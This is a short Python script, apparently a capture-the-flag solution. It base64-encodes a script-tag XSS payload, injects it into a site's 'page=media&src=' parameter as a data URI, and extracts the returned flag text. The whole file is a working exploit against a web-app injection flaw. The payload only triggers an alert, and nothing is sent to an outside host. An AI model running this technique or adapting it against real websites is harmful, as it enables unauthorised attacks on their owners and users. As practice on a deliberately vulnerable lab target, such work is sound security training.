import base64
import requests

ip = input("site ip = ")

payload = '<script>alert("GIMME THE FLAG");</script>'
encoded_payload = base64.b64encode(payload.encode()).decode()

try:
	response = requests.get(f"http://{ip}/?page=media&src=data:text/html;base64,{encoded_payload}")
	content = str(response.content)
	start = content.index("The flag is")
	end = content.index("<", start)
	flag = content[start:end]
	print(flag)
	
except Exception as e:
	print(e)